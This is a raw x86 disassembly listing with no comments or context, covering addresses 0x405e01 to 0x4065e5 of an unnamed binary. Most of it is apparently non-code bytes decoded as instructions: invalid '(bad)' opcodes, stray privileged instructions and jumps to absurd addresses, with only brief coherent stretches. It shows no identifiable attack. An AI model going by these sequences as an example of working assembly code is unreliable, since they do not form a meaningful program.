  405e01:	add    eax,0x42ef0e4b
  405e06:	xlat   BYTE PTR ds:[ebx]
  405e07:	jnp    0x405dd2
  405e09:	jns    0x405dea
  405e0b:	cmp    ch,BYTE PTR cs:[edx]
  405e0e:	cmp    BYTE PTR [ecx+0x66],dh
  405e11:	xchg   edi,eax
  405e12:	jmp    0xab4e02f5
  405e17:	mov    ah,0x58
  405e19:	sar    BYTE PTR [ebp*8-0xb66a16f],1
  405e20:	xchg   ebp,eax
  405e21:	inc    eax
  405e22:	pop    esp
  405e23:	movntq QWORD PTR [esi+0x4b0e495d],mm1
  405e2a:	jne    0x405e52
  405e2c:	xor    edx,0x80000000
  405e32:	mov    DWORD PTR [ebp+0x14],edx
  405e35:	mov    edx,DWORD PTR [esi+0x4]
  405e38:	xor    eax,0xcb89b677
  405e3d:	jmp    0x4060e7
  405e42:	enter  0xf019,0xdb
  405e46:	xor    BYTE PTR [ebx],ah
  405e48:	fdivr  DWORD PTR [ecx]
  405e4a:	xchg   esp,eax
  405e4b:	fldenv [ebx+0x45]
  405e4e:	xor    cl,bh
  405e50:	ja     0x405e57
  405e52:	and    ebx,DWORD PTR [esi]
  405e54:	mov    ebx,0xbbbfd0bb
  405e59:	mov    ebx,0x10b61b72
  405e5e:	pop    ecx
  405e5f:	mov    ds:0x79dddba5,al
  405e64:	and    al,0x9e
  405e66:	pop    esp
  405e68:	outs   dx,BYTE PTR ds:[esi]
  405e69:	scas   al,BYTE PTR es:[edi]
  405e6a:	in     al,0x45
  405e6c:	mov    ds:0x8683537f,eax
  405e71:	inc    eax
  405e72:	lahf   
  405e73:	dec    ebp
  405e74:	sub    al,0x19
  405e76:	dec    ebx
  405e77:	and    ah,bl
  405e79:	(bad)
  405e7d:	adc    BYTE PTR [ecx+0x3],bl
  405e80:	sbb    eax,0x6100beb8
  405e85:	in     al,0x30
  405e87:	dec    esi
  405e88:	and    DWORD PTR [ebp+0x51],edx
  405e8b:	cmp    al,0x33
  405e8d:	in     eax,0x69
  405e8f:	aaa    
  405e90:	sbb    DWORD PTR fs:[edx+ebp*4],esp
  405e94:	xchg   ecx,eax
  405e95:	add    DWORD PTR [ecx-0x7b7aec27],0x6d5a2763
  405e9f:	loopne 0x405e69
  405ea1:	pop    edx
  405ea3:	sbb    BYTE PTR [edi-0x56319daa],dl
  405ea9:	sbb    eax,0x784bcb2
  405eae:	push   0x37
  405eb0:	ins    BYTE PTR es:[edi],dx
  405eb1:	jno    0x405e38
  405eb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eb4:	inc    ebp
  405eb5:	sbb    eax,0xfa89efc8
  405eba:	xchg   esi,eax
  405ebb:	dec    ebx
  405ebc:	fcom   QWORD PTR ds:0x19f5eb99
  405ec2:	pop    ebx
  405ec3:	rol    bh,0x3a
  405ec6:	shl    BYTE PTR ss:[ebx],1
  405ec9:	ffree  st(3)
  405ecb:	mov    al,0x91
  405ecd:	leave  
  405ece:	jmp    0x8f384b74
  405ed3:	bound  ebx,QWORD PTR [esi]
  405ed5:	push   esp
  405ed6:	xor    ecx,edi
  405ed8:	xor    BYTE PTR [ebx-0x1890453b],ah
  405ede:	jle    0x405f07
  405ee0:	sbb    BYTE PTR [edx+0x38],dl
  405ee3:	sub    edx,DWORD PTR [ecx-0x472549ac]
  405ee9:	fstp   QWORD PTR [edx-0x28]
  405eec:	xchg   esp,eax
  405eed:	push   0x1a
  405eef:	push   0x5d
  405ef1:	mov    edi,0x84c2629a
  405ef6:	xor    eax,0x17d79bed
  405efb:	iret   
  405efc:	pop    ebx
  405efd:	js     0x405f2d
  405eff:	outs   dx,BYTE PTR cs:[esi]
  405f01:	add    edi,DWORD PTR [eax+0x1607c3e2]
  405f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f08:	xchg   DWORD PTR [ebx],esi
  405f0a:	xchg   ebx,eax
  405f0b:	addr16 mov eax,ds:0xb2de
  405f0f:	hlt    
  405f10:	pop    es
  405f11:	jno    0x405ebc
  405f13:	fs pop edi
  405f15:	mov    eax,0xc4d42f51
  405f1a:	xchg   esp,eax
  405f1b:	ins    BYTE PTR es:[edi],dx
  405f1c:	stos   DWORD PTR es:[edi],eax
  405f1d:	sti    
  405f1e:	fwait
  405f1f:	mov    eax,0x24a9aa47
  405f24:	jl     0x405f6f
  405f26:	test   ah,ah
  405f28:	xchg   ebp,eax
  405f29:	mov    ebx,0x33b2f85b
  405f2e:	cdq    
  405f2f:	push   ebp
  405f30:	mov    al,0x92
  405f32:	sbb    DWORD PTR [edx],edx
  405f34:	xor    cl,BYTE PTR [ecx]
  405f36:	pop    ebx
  405f37:	lock fdivr QWORD PTR fs:[edi+0x56a388af]
  405f3f:	add    esi,0x73
  405f42:	cdq    
  405f43:	int3   
  405f44:	cmc    
  405f45:	test   al,0x59
  405f47:	lock (bad) [eax-0x2bf74388]
  405f4e:	cmp    eax,0xf27587e8
  405f53:	dec    ebp
  405f54:	retf   0x4b49
  405f57:	inc    ecx
  405f58:	stc    
  405f59:	test   DWORD PTR [ecx],esp
  405f5b:	iret   
  405f5c:	push   ss
  405f5d:	push   es
  405f5e:	enter  0x6ea5,0xe9
  405f62:	sbb    eax,0x72d17e20
  405f67:	(bad)
  405f6c:	jbe    0x405f70
  405f6e:	ret    0x22aa
  405f71:	call   0x253c:0xeb85e340
  405f78:	jmp    0x405f5b
  405f7a:	in     al,0xa9
  405f7c:	mov    DWORD PTR [edx-0x33],esi
  405f7f:	cmp    BYTE PTR [edx-0x30736ea1],dl
  405f85:	into   
  405f86:	inc    edx
  405f87:	mov    cl,0x31
  405f89:	in     eax,dx
  405f8a:	cwde   
  405f8b:	add    BYTE PTR [esi-0x6637910d],bh
  405f91:	push   ebx
  405f92:	inc    eax
  405f93:	(bad)  
  405f94:	lock loopne 0x405fca
  405f97:	and    al,0x10
  405f99:	sbb    ebx,edx
  405f9b:	jge    0x405f70
  405f9d:	push   edi
  405f9e:	push   ebx
  405f9f:	jno    0x405fd5
  405fa1:	(bad)  
  405fa2:	xor    BYTE PTR [ebp-0x7e126919],al
  405fa8:	jmp    0x6728:0x936d53fb
  405faf:	sub    BYTE PTR [ebx+ebx*2+0x6b50ccc7],0x6b
  405fb7:	rol    BYTE PTR fs:[ebx+0x510c0a9d],1
  405fbe:	jle    0x405fc5
  405fc0:	scas   al,BYTE PTR es:[edi]
  405fc1:	mov    cl,0x4e
  405fc3:	clc    
  405fc4:	data16 fld st(3)
  405fc7:	mov    dh,BYTE PTR [edi-0x438ff2dc]
  405fcd:	sahf   
  405fce:	test   BYTE PTR [esi+0x1e],cl
  405fd1:	pop    esp
  405fd2:	push   esi
  405fd3:	and    al,0xb4
  405fd5:	add    ebx,DWORD PTR [ebx]
  405fd7:	dec    edi
  405fd8:	(bad)
  405fdc:	mov    WORD PTR [ebx+0x7c],di
  405fe0:	jne    0x405fba
  405fe2:	pop    ecx
  405fe3:	mov    bl,0xcb
  405fe5:	das    
  405fe6:	mov    cl,0x77
  405fe8:	cmp    al,BYTE PTR [ebp+0x1e]
  405feb:	sbb    eax,0x79bb5f99
  405ff0:	stc    
  405ff1:	daa    
  405ff2:	jmp    0xcc48bb7c
  405ff7:	cld    
  405ff8:	dec    edx
  405ff9:	push   0x9e149684
  405ffe:	inc    ecx
  405fff:	cld    
  406000:	sahf   
  406001:	(bad)  
  406002:	adc    ch,dh
  406004:	dec    esi
  406005:	xchg   DWORD PTR es:[ecx+eax*4],ebp
  406009:	pop    edi
  40600a:	cs in  eax,0x85
  40600d:	inc    ecx
  40600e:	jns    0x405fea
  406010:	scas   eax,DWORD PTR es:[edi]
  406011:	popa   
  406012:	loope  0x405fdb
  406014:	call   0x7f74:0xa3128cf6
  40601b:	or     al,0x8b
  40601d:	in     al,dx
  40601e:	addr16 mov bh,0x61
  406021:	sbb    DWORD PTR [ecx-0x2a],esp
  406024:	mov    esp,0x44c9da6c
  406029:	push   ecx
  40602a:	xchg   esp,eax
  40602b:	mul    BYTE PTR [ecx+eiz*4+0x0]
  40602f:	imul   esp,DWORD PTR [eax+ebx*8+0x4f384fe3],0x4dc06788
  40603a:	jg     0x406099
  40603c:	sbb    di,dx
  40603f:	not    bl
  406041:	pop    es
  406042:	dec    eax
  406043:	retf   0x750d
  406046:	adc    edx,DWORD PTR [edi+0x7d804b65]
  40604c:	xorps  xmm3,XMMWORD PTR [edx]
  40604f:	in     eax,dx
  406050:	popa   
  406051:	inc    eax
  406052:	rol    BYTE PTR [eax-0x4e],1
  406055:	out    dx,al
  406056:	(bad)  
  406057:	clc    
  406058:	mov    esp,DWORD PTR [eax+0x141a4def]
  40605e:	xor    eax,0x54263c9f
  406063:	scas   al,BYTE PTR es:[edi]
  406064:	stc    
  406065:	test   DWORD PTR [esi+0x10044de9],esi
  40606b:	call   0x5381280a
  406070:	sub    al,0x8
  406072:	xchg   ecx,eax
  406073:	cdq    
  406074:	out    0xfb,eax
  406076:	iret   
  406077:	and    al,BYTE PTR [edi+0x436ff9bb]
  40607d:	xchg   BYTE PTR [eax],bl
  40607f:	push   0x4a
  406081:	mov    ebp,0x245262bd
  406086:	sahf   
  406087:	enter  0x508f,0x8c
  40608b:	and    esp,DWORD PTR [ecx+0x4ea757e5]
  406091:	mov    ds:0xe9d8464d,al
  406096:	adc    edi,DWORD PTR [ebx+0x48d49f0]
  40609c:	cmp    DWORD PTR [ecx+0x19],esp
  40609f:	aaa    
  4060a0:	lds    eax,FWORD PTR [ecx]
  4060a2:	das    
  4060a3:	cs mov dh,0xef
  4060a6:	mov    edi,0x6e6908e9
  4060ab:	or     eax,0x8978fdfa
  4060b0:	xor    al,0x26
  4060b2:	sub    bl,ch
  4060b4:	jmp    0xd8537334
  4060b9:	xchg   ecx,eax
  4060ba:	mov    al,ds:0x6a48823a
  4060bf:	fxam   
  4060c1:	adc    DWORD PTR [edi-0x7b],ebx
  4060c4:	jmp    DWORD PTR [eax+eax*1+0x5e]
  4060c8:	std    
  4060c9:	jl     0x4060ac
  4060cb:	jae    0x406084
  4060cd:	jbe    0x406136
  4060cf:	mov    eax,ds:0xf9fe87ef
  4060d4:	push   ss
  4060d5:	retf   0x2758
  4060d8:	repz push ss
  4060da:	(bad)  
  4060db:	xchg   edx,eax
  4060dc:	mov    ecx,0x3167ba51
  4060e1:	xchg   ebx,eax
  4060e2:	shl    bl,1
  4060e4:	test   eax,0xca33d7a3
  4060e9:	shrd   eax,ecx,0x2
  4060ed:	or     eax,DWORD PTR [ebp+0x10]
  4060f0:	shr    ecx,0x2
  4060f3:	mov    DWORD PTR [ebp+0x8],eax
  4060f6:	mov    eax,ecx
  4060f8:	or     eax,DWORD PTR [ebp+0x14]
  4060fb:	mov    ecx,DWORD PTR [ebx]
  4060fd:	mov    edx,DWORD PTR [ebx+0x4]
  406100:	push   eax
  406101:	push   DWORD PTR [ebp+0x8]
  406104:	push   edx
  406105:	push   ecx
  406106:	call   0x421ba4
  40610b:	mov    eax,DWORD PTR [esi]
  40610d:	mov    ecx,DWORD PTR [esi+0x4]
  406110:	shrd   eax,ecx,0x2
  406114:	shr    ecx,0x2
  406117:	shr    edx,0x1e
  40611a:	xor    ecx,0xe74ae2be
  406120:	push   ecx
  406121:	xor    eax,edi
  406123:	mov    DWORD PTR [ebp+0x10],edx
  406126:	mov    edx,DWORD PTR [ebx]
  406128:	mov    edi,DWORD PTR [ebx+0x4]
  40612b:	push   eax
  40612c:	push   edi
  40612d:	push   edx
  40612e:	call   0x421ba4
  406133:	jmp    0x4063dd
  406138:	xchg   esi,eax
  406139:	(bad)  
  40613a:	cmp    esi,DWORD PTR [ebx+0x43]
  40613d:	mov    bh,0xb6
  40613f:	scas   eax,DWORD PTR es:[edi]
  406140:	out    0x7e,eax
  406142:	cmp    esi,DWORD PTR [ecx+0x78]
  406145:	popf   
  406146:	sar    bl,1
  406148:	cmp    BYTE PTR [eax],ch
  40614a:	mov    ebx,0xbbbfd0bb
  40614f:	mov    ebx,0x200086b
  406154:	out    0x18,al
  406156:	in     eax,dx
  406157:	gs dec esp
  406159:	adc    eax,0x45198222
  40615e:	je     0x406130
  406160:	dec    esi
  406161:	cwde   
  406162:	lock sub DWORD PTR [ebp+edi*4-0x43],ebp
  406167:	adc    eax,0xf61ac8ba
  40616c:	cmp    DWORD PTR ds:0x3e070dc3,0x8a4a44ab
  406176:	loope  0x4061a7
  406178:	cmp    esp,DWORD PTR [eax+0x6d76fa78]
  40617e:	imul   BYTE PTR [eax]
  406180:	int    0x37
  406182:	jb     0x4061b1
  406184:	stos   BYTE PTR es:[edi],al
  406185:	test   BYTE PTR [ebp-0x784bbaae],ah
  40618b:	add    ah,BYTE PTR [ecx]
  40618d:	push   es
  40618e:	je     0x406159
  406190:	gs (bad) 
  406192:	dec    edi
  406193:	(bad)  
  406194:	adc    DWORD PTR [edx],edi
  406196:	popf   
  406197:	xchg   edx,eax
  406198:	in     eax,0xfb
  40619a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40619b:	(bad)  
  40619c:	das    
  40619d:	lods   al,BYTE PTR ds:[esi]
  40619e:	mov    dl,0x6a
  4061a0:	jbe    0x4061f3
  4061a2:	lods   al,BYTE PTR ds:[esi]
  4061a3:	inc    esp
  4061a4:	jge    0x40618d
  4061a6:	xor    BYTE PTR [edi+esi*4-0x50],ch
  4061aa:	add    ebp,eax
  4061ac:	xchg   DWORD PTR [eax+eiz*8+0x3d6aad66],ecx
  4061b3:	std    
  4061b4:	scas   eax,DWORD PTR es:[edi]
  4061b5:	and    edi,esi
  4061b7:	mov    bh,0xb2
  4061b9:	fdivr  st,st(1)
  4061bb:	push   ebp
  4061bc:	push   edx
  4061bd:	mov    WORD PTR [esi-0x40a944bf],fs
  4061c3:	hlt    
  4061c4:	hlt    
  4061c5:	out    dx,al
  4061c6:	push   esp
  4061c7:	push   es
  4061c8:	das    
  4061c9:	cdq    
  4061ca:	xor    DWORD PTR [edx],eax
  4061cc:	ret    0x56bd
  4061cf:	jns    0x4061bf
  4061d1:	sbb    BYTE PTR [edx-0x432fbafe],al
  4061d7:	xor    al,0x87
  4061d9:	add    dl,0x9f
  4061dc:	lahf   
  4061dd:	mov    ecx,0x228fe2b1
  4061e2:	jnp    0x4061b5
  4061e4:	retf   
  4061e5:	push   ecx
  4061e6:	pop    ecx
  4061e7:	test   al,0x7
  4061e9:	lods   al,BYTE PTR ds:[esi]
  4061ea:	lds    ebx,FWORD PTR [edi-0x3da49a3f]
  4061f0:	pop    ds
  4061f1:	(bad)  
  4061f2:	xor    BYTE PTR [edx+esi*4],dh
  4061f5:	aam    0x8a
  4061f7:	fist   DWORD PTR [ebp+0x79]
  4061fa:	cwde   
  4061fb:	push   esi
  4061fc:	lds    ebx,FWORD PTR [ebx+0x194fe96]
  406202:	mov    BYTE PTR [ebp-0x15c485c],bh
  406208:	xchg   ebp,eax
  406209:	adc    eax,0x850779d5
  40620e:	xchg   edx,eax
  40620f:	cmp    dl,BYTE PTR [edi-0x5]
  406212:	inc    edi
  406213:	fld    QWORD PTR [edx+0x7c7bbb7b]
  406219:	clc    
  40621a:	std    
  40621b:	out    dx,al
  40621c:	(bad)  
  40621d:	mov    dh,0x9c
  40621f:	cli    
  406220:	push   es
  406221:	and    bl,dl
  406223:	shr    BYTE PTR [esi+0x5af4ac7e],0x0
  40622a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40622b:	sbb    DWORD PTR [ecx+edx*2],edx
  40622e:	call   0x430c:0xc203955
  406235:	gs out 0x8d,eax
  406238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406239:	dec    ebx
  40623a:	dec    esi
  40623b:	pop    es
  40623c:	cli    
  40623d:	aas    
  40623e:	rcl    BYTE PTR [eax+0x61143e5a],1
  406244:	xor    eax,0xfe121517
  406249:	in     al,0x26
  40624b:	arpl   WORD PTR [eax+0x7afe2570],bp
  406251:	xlat   BYTE PTR ds:[ebx]
  406252:	xor    edi,DWORD PTR [edi]
  406254:	xchg   esp,eax
  406255:	lock xor al,0xec
  406258:	pop    ds
  406259:	outs   dx,BYTE PTR ds:[esi]
  40625a:	arpl   WORD PTR [eax-0x120a43ba],bx
  406260:	or     al,0x20
  406262:	push   ebp
  406263:	and    eax,0x9c1d058b
  406268:	or     BYTE PTR [esi+0x74],ah
  40626b:	mov    bl,0xbe
  40626d:	or     edx,DWORD PTR [edx+ebx*2+0x8]
  406271:	imul   eax,DWORD PTR [edx+ebx*4+0x62307609],0xa15a7b6a
  40627c:	sub    DWORD PTR [eax+0x4e5b2e6c],esi
  406282:	outs   dx,DWORD PTR ds:[esi]
  406283:	enter  0xa470,0x90
  406287:	test   eax,0x522a1bd4
  40628c:	cmp    DWORD PTR [eax],esp
  40628e:	pop    esi
  40628f:	loopne 0x406298
  406291:	xchg   edx,eax
  406292:	hlt    
  406293:	xor    edx,ebp
  406295:	cmp    eax,0x8ceae6cc
  40629a:	hlt    
  40629b:	scas   al,BYTE PTR es:[edi]
  40629c:	or     dh,BYTE PTR [eax-0x55]
  40629f:	mov    ch,0x83
  4062a1:	push   ecx
  4062a2:	lock mov ebp,0xec25511a
  4062a8:	xor    BYTE PTR [edi-0x68ea5f],cl
  4062ae:	leave  
  4062af:	adc    al,0xbb
  4062b1:	mov    ecx,0x8df26177
  4062b6:	push   eax
  4062b7:	inc    DWORD PTR [edi-0x6b]
  4062ba:	shl    DWORD PTR [ecx],0xdf
  4062bd:	int    0x7b
  4062bf:	add    DWORD PTR [edi+edx*4+0x31],esi
  4062c3:	stos   DWORD PTR es:[edi],eax
  4062c4:	xor    ch,dh
  4062c6:	sti    
  4062c7:	repz fld st(1)
  4062ca:	mov    bh,0xa1
  4062cc:	aas    
  4062cd:	(bad)  
  4062cf:	sub    ah,0x62
  4062d2:	ja     0x4062b6
  4062d4:	ins    BYTE PTR es:[edi],dx
  4062d5:	xor    ecx,eax
  4062d7:	(bad)  
  4062d8:	sub    al,0x69
  4062da:	fnstcw WORD PTR [ebp+0x6049d627]
  4062e0:	pop    ds
  4062e1:	fild   WORD PTR [ecx+0x42]
  4062e4:	dec    edi
  4062e5:	dec    edx
  4062e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062e7:	hlt    
  4062e8:	jno    0x4062c4
  4062ea:	(bad)  
  4062eb:	pop    ss
  4062ec:	and    bh,BYTE PTR [eax]
  4062ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062ef:	and    esi,esi
  4062f1:	inc    eax
  4062f2:	inc    ecx
  4062f3:	ins    DWORD PTR es:[edi],dx
  4062f4:	mov    ebx,0x91c4d454
  4062f9:	gs int 0xf3
  4062fc:	dec    esi
  4062fd:	push   edx
  4062fe:	stos   BYTE PTR es:[edi],al
  4062ff:	or     eax,0x8e35a53d
  406304:	xchg   edi,eax
  406305:	outs   dx,DWORD PTR ds:[esi]
  406306:	lea    edx,[eax+0x5ffdfc0b]
  40630c:	pop    esp
  40630d:	pop    edx
  40630e:	or     esp,ebp
  406310:	mov    BYTE PTR [edx+0x18bad9b],ch
  406316:	data16 cmp BYTE PTR [ebx-0xe0ddb9a],dl
  40631d:	in     al,dx
  40631e:	repnz fdivr DWORD PTR [eax+0x2f]
  406322:	outs   dx,BYTE PTR ds:[esi]
  406323:	dec    edx
  406324:	lahf   
  406325:	xor    BYTE PTR [eax-0x6c],ch
  406328:	stos   DWORD PTR es:[edi],eax
  406329:	mov    BYTE PTR [edx+0x4d],ah
  40632c:	dec    ebx
  40632d:	fistp  QWORD PTR [ebp-0x7ef97cf1]
  406333:	addr16 test al,0xbc
  406336:	mov    esp,0x4fbd706a
  40633b:	adc    eax,0xe842a8d8
  406340:	or     BYTE PTR [edi+0x9],0x92
  406344:	xchg   ebp,eax
  406345:	add    DWORD PTR [edi+0x2c],ebp
  406348:	lahf   
  406349:	pop    esi
  40634a:	aaa    
  40634b:	aas    
  40634c:	aas    
  40634d:	ja     0x4062ed
  40634f:	mov    ebp,0xb4aeb010
  406354:	dec    edx
  406355:	adc    BYTE PTR [edx-0x6456ed1d],al
  40635b:	dec    eax
  40635c:	retf   
  40635d:	and    DWORD PTR [edi-0x16],esp
  406360:	mov    WORD PTR [edi+0x75],cs
  406363:	shl    esp,cl
  406365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406366:	mov    esi,0x28c2f769
  40636b:	mov    dh,dh
  40636d:	add    ebp,DWORD PTR [ebx-0x37cae2cc]
  406373:	loopne 0x4062f7
  406375:	adc    eax,0xe3114b63
  40637a:	sbb    ch,dl
  40637c:	pop    es
  40637d:	pusha  
  40637e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40637f:	imul   ebx,edi,0xffffffb9
  406382:	xor    al,0x9f
  406384:	and    ebx,edx
  406386:	jmp    FWORD PTR [edi+edi*4-0x20e05c1a]
  40638d:	mov    bl,0x70
  40638f:	bound  eax,QWORD PTR [edi]
  406391:	lock cdq 
  406393:	aam    0xd2
  406395:	adc    dl,BYTE PTR [ebx-0x43]
  406398:	aad    0xf9
  40639a:	repnz scas al,BYTE PTR es:[edi]
  40639c:	popa   
  40639d:	mov    ebx,0x512da86f
  4063a2:	fld    TBYTE PTR [edi-0x10]
  4063a5:	push   eax
  4063a6:	retf   0x81ae
  4063a9:	fisubr WORD PTR [ebx-0x59922ddf]
  4063af:	mov    cl,0x82
  4063b1:	rcr    ch,0xc4
  4063b4:	xor    eax,0xffff3894
  4063b9:	sbb    BYTE PTR [edx+0x5d],cl
  4063bc:	mov    dh,0xa2
  4063be:	pop    es
  4063bf:	or     eax,0x4b1a7a98
  4063c4:	jbe    0x4063c5
  4063c6:	push   es
  4063c7:	cld    
  4063c8:	xor    eax,0xca629261
  4063cd:	dec    ecx
  4063ce:	fsub   DWORD PTR [ecx+ebx*4+0x6f2cb34]
  4063d5:	push   eax
  4063d6:	or     eax,0xecb818db
  4063db:	xchg   esi,eax
  4063dc:	loop   0x4063ed
  4063de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063df:	ret    0xc102
  4063e2:	loopne 0x4063e6
  4063e4:	mov    ecx,eax
  4063e6:	or     ecx,DWORD PTR [ebp+0x10]
  4063e9:	xor    eax,eax
  4063eb:	or     edx,eax
  4063ed:	xor    ecx,0xcb89b676
  4063f3:	xor    edx,0x9d2b8af8
  4063f9:	mov    DWORD PTR [esi],ecx
  4063fb:	mov    DWORD PTR [esi+0x4],edx
  4063fe:	jmp    0x4066a8
  406403:	mov    BYTE PTR [eax],bl
  406405:	scas   eax,DWORD PTR es:[edi]
  406406:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406407:	scas   eax,DWORD PTR es:[edi]
  406408:	lods   eax,DWORD PTR ds:[esi]
  406409:	cdq    
  40640a:	cmp    al,0x21
  40640c:	mov    ebx,0xc811452d
  406411:	rdtsc  
  406413:	inc    edi
  406414:	sub    al,0xbb
  406416:	mov    ebx,0xbbbbbfd0
  40641b:	retf   
  40641c:	(bad)  
  40641d:	adc    edi,DWORD PTR [edx]
  40641f:	adc    al,0xc2
  406421:	fxch   st(0)
  406423:	ja     0x406425
  406425:	add    eax,0x4245be89
  40642a:	ins    DWORD PTR es:[edi],dx
  40642b:	jno    0x406422
  40642d:	je     0x406414
  40642f:	int3   
  406430:	sub    ebp,DWORD PTR [edx+ebx*1+0x4285f113]
  406437:	popa   
  406438:	ds jo  0x406472
  40643b:	imul   esp,DWORD PTR [edx],0xdf616956
  406441:	cwde   
  406442:	or     edi,DWORD PTR [edi+0x9]
  406445:	fs sub ebx,0xfffffff0
  406449:	(bad)  
  40644a:	aaa    
  40644b:	das    
  40644c:	ret    0x643d
  40644f:	add    ebx,edi
  406451:	jno    0x4064ae
  406453:	dec    esi
  406454:	daa    
  406455:	mov    bl,bh
  406457:	jge    0x40641c
  406459:	pop    DWORD PTR [eax-0x14f32b8d]
  40645f:	stc    
  406460:	arpl   WORD PTR [eax-0x59],bx
  406463:	(bad)  
  406464:	mov    edi,0x9a396745
  406469:	push   esp
  40646a:	(bad)  
  40646b:	popf   
  40646c:	(bad)  
  40646d:	repz or ebx,0xffffff9c
  406471:	mov    cl,BYTE PTR [ebx-0x35]
  406474:	addr16 ds jb 0x40643d
  406478:	pop    ss
  406479:	jne    0x4064d1
  40647b:	mov    eax,ds:0x520fe017
  406480:	push   ss
  406481:	arpl   ax,bp
  406483:	mov    esp,DWORD PTR [esi-0x563c5087]
  406489:	std    
  40648a:	bound  eax,QWORD PTR [ebx-0x4c7da99]
  406490:	ffreep st(3)
  406492:	aam    0xdf
  406494:	mov    WORD PTR [ebx-0x7fbab97a],ss
  40649a:	inc    ecx
  40649b:	cdq    
  40649c:	pushf  
  40649d:	dec    esi
  40649f:	pop    ds
  4064a0:	mov    bh,0xe7
  4064a2:	imul   ecx,eax,0x369cc79
  4064a8:	dec    esi
  4064a9:	outs   dx,BYTE PTR ds:[esi]
  4064aa:	hlt    
  4064ab:	scas   al,BYTE PTR es:[edi]
  4064ac:	daa    
  4064ad:	xor    al,0x91
  4064af:	pop    ebp
  4064b0:	pop    es
  4064b1:	push   ebp
  4064b2:	mov    al,ds:0xdd40c571
  4064b7:	mov    eax,ds:0xcec4b803
  4064bc:	inc    eax
  4064bd:	fsubr  QWORD PTR [edx+0x59]
  4064c0:	fs leave 
  4064c2:	shr    BYTE PTR [edx+0x3a737a1d],1
  4064c8:	sbb    ch,BYTE PTR [ebx]
  4064ca:	aad    0x31
  4064cc:	push   esp
  4064cd:	cmp    BYTE PTR [ecx],0x98
  4064d0:	aad    0x42
  4064d2:	mov    ebp,0xec6d91c3
  4064d7:	data16 mov al,0x69
  4064da:	cmc    
  4064db:	fwait
  4064dc:	mov    ds:0xe2882e7e,eax
  4064e1:	stc    
  4064e2:	dec    edi
  4064e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064e4:	mov    WORD PTR [eax],ds
  4064e6:	cs enter 0xce8a,0x95
  4064eb:	pusha  
  4064ec:	mov    BYTE PTR [edx+ecx*1+0x30b62b75],al
  4064f3:	fisubr DWORD PTR [edx]
  4064f5:	cmp    eax,0xc29a76e3
  4064fa:	push   ebx
  4064fb:	div    BYTE PTR [ebp+0x2a5eab1e]
  406501:	lods   eax,DWORD PTR ds:[esi]
  406502:	inc    ebp
  406503:	and    eax,0xf080f85d
  406508:	sub    eax,0x74d3c427
  40650d:	jle    0x40649e
  40650f:	adc    bl,ch
  406511:	add    ebx,edi
  406513:	push   ds
  406514:	push   ebp
  406515:	icebp  
  406516:	lds    esp,FWORD PTR [ebx+0x41]
  406519:	lods   eax,DWORD PTR ds:[esi]
  40651a:	test   eax,0xaedd33c6
  40651f:	lea    eax,[ecx]
  406521:	inc    edx
  406522:	lahf   
  406523:	lods   eax,DWORD PTR ds:[esi]
  406524:	popa   
  406525:	pop    esp
  406526:	cld    
  406527:	jns    0x406562
  406529:	mov    dl,0x69
  40652b:	out    dx,al
  40652c:	mov    cl,al
  40652e:	ja     0x406536
  406530:	(bad)  
  406532:	jbe    0x4064b8
  406534:	and    BYTE PTR [ebx-0x37],bh
  406537:	push   ecx
  406538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406539:	adc    DWORD PTR [ecx-0x33],edx
  40653c:	sbb    DWORD PTR [ebp+0x32d51e21],ebx
  406542:	mov    ebx,0x2ecbfa35
  406547:	mov    ebx,0xed99f5ca
  40654c:	outs   dx,BYTE PTR ds:[esi]
  40654d:	dec    ecx
  40654e:	cs in  al,dx
  406550:	xlat   BYTE PTR ds:[ebx]
  406551:	fnstsw WORD PTR [ecx+0x45e10587]
  406557:	repnz xor DWORD PTR [edi+0x5],esp
  40655b:	stc    
  40655c:	iret   
  40655d:	fst    st(3)
  40655f:	adc    BYTE PTR [esi-0x2b],ch
  406562:	cmp    al,0x37
  406564:	ret    0xc9e9
  406567:	jmp    0x40657e
  406569:	fcom   DWORD PTR [eax]
  40656b:	rcr    edx,1
  40656d:	rcl    BYTE PTR [eax+0x7a491208],cl
  406573:	int3   
  406574:	push   eax
  406575:	stc    
  406576:	xchg   edx,eax
  406577:	imul   edx,ebx,0x76
  40657a:	mov    ch,BYTE PTR [esp+edi*8]
  40657d:	jl     0x406507
  40657f:	push   cs
  406580:	adc    eax,0xb3dacb2a
  406585:	pusha  
  406586:	adc    DWORD PTR [ecx],ebp
  406588:	adc    dl,ch
  40658a:	jne    0x40659e
  40658c:	(bad)  
  40658d:	enter  0x9e7d,0xa9
  406591:	hlt    
  406592:	fst    QWORD PTR [ebp+0x24ef36eb]
  406598:	add    edx,DWORD PTR [edx-0x64]
  40659b:	fild   WORD PTR [ebx+0x3d]
  40659e:	push   edi
  40659f:	adc    BYTE PTR [edi+0x7],cl
  4065a2:	mov    al,0x5c
  4065a4:	sbb    dl,ah
  4065a6:	test   eax,0x14ac3883
  4065ab:	test   bh,bl
  4065ad:	xchg   esi,eax
  4065ae:	mov    ecx,0x41b03bac
  4065b3:	(bad)  
  4065b4:	sub    ah,ah
  4065b6:	pusha  
  4065b7:	test   al,0x66
  4065b9:	fistp  QWORD PTR fs:[edi-0x2ca3b1d2]
  4065c0:	hlt    
  4065c1:	cs das 
  4065c3:	(bad)  
  4065c4:	mov    eax,0xcef333f1
  4065c9:	push   ebp
  4065ca:	mov    WORD PTR [eax+esi*1+0x1bb319f8],cs
  4065d1:	sar    ecx,0x67
  4065d4:	pop    ebx
  4065d5:	pushf  
  4065d6:	pushf  
  4065d7:	sub    dh,dh
  4065d9:	daa    
  4065da:	(bad)  
  4065db:	xchg   ebx,eax
  4065dc:	xor    DWORD PTR [ebp+0x2df3f392],eax
  4065e2:	jo     0x4065f1
  4065e4:	push   esi
  4065e5:	push   ecx
